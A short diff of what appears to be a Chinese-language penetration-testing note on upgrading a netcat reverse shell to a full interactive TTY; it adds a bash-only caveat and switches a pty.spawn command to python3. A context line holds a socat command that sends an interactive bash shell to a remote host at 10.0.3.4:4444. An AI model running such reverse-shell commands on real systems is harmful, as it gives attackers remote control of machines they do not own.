@@ -43,6 +43,8 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ### Upgrading from netcat with magic
 
+> 注意：这种方式只适用于 bash，不适用于 zsh
+
 首先，使用Python生成一个PTY。一旦bash在PTY中运行，用 `Ctrl-Z` 将shell放到后台。
 
 ![20240405230443](https://gh.iinx.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240405230443.png)
@@ -135,7 +137,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ```bash
 # In reverse shell
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
 
 # In Kali
